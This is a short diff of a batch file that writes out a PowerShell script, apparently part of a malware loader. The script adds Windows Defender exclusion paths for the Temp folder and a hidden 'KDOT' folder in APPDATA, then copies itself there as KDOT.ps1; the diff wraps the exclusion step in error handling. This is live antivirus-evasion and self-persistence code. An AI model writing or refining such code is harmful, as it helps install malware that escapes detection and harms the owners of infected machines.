@@ -7,8 +7,12 @@ echo. >> powershell.ps1
 echo function TASKS { >> powershell.ps1
 echo     $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT" >> powershell.ps1
 echo     if ($test_KDOT -eq $false) { >> powershell.ps1
-echo         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell.ps1
-echo         Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell.ps1
+echo         try { >> powershell.ps1
+echo             Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell.ps1
+echo             Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell.ps1
+echo         } catch { >> powershell.ps1
+echo             Write-Host "Failed to add exclusions" >> powershell.ps1
+echo         } >> powershell.ps1
 echo         New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" >> powershell.ps1
 echo         $origin = $PSCommandPath >> powershell.ps1
 echo         Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" >> powershell.ps1
